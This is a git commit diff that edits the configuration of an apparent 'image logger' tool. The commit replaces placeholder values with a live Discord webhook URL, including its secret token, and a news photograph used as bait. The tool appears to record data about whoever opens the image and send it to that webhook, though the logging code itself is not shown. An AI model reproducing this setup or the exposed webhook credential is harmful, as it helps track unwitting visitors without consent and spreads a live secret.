16eead8ca95c8e350946ca9215c5029801276a6b
MoonCode717 <mooncodemc@gmail.com>
2025-02-01 11:36:52 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1335196200508330024/HV46qMkpxrbHs_yJrYZCK3A1YRsS8_GkWqpDn-wzQjUkv5bwLOYVoG3JS77-SduOVrMv",
+    "image": "https://media.npr.org/assets/img/2015/02/13/reeves-f610c40457f259110600b974ae67c43aa313beb8-s1100-c50.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
